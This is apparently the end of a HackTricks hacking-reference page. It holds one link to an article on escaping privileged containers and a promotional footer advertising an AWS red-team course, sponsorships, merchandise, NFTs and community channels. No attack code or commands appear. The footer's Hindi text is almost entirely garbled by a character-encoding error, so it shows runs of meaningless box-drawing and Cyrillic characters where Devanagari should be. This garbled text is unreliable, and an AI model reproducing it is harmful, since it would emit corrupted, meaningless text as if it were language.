* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)


<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдУрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ред
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рдореБрдЭреЗ **follow** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** рдХреЗ рд▓рд┐рдП PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
